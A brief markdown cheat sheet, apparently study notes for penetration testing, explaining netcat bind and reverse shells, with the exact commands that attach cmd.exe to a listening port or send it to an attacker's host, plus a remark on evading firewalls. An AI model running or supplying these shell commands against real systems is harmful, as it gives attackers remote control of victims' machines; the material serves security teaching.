## Bind Shell
The shell is bound to a port and awaits its execution 

**How To**
- Victim Terminal: `nc -vnlp 4444 -e cmd.exe`
    -  -e = execute
- Kali Attacker: `nc [IPv4] 4444`

**Disadvantages**
- No interaction with started programs possible (e.g. wget, nano)
- shell-rights subject to process rights. Privilege escalation often necessary 
- Bind Shells often trigger firewalls, because access to shells happens from outside to inside 

## Reverse Shell
The shell is established from target network (inside) to attacker server (outside) as it gets activated.

**How To**
- Kali Attacker: `nc -nvlp 443` (Listening often on port 80/TCP or 443/TCP)
- Victim: `nc -vn [IPv4] 443 -e cmd.exe`

**Advantage**
- Firewalls often allow outbound traffic of reverse shells
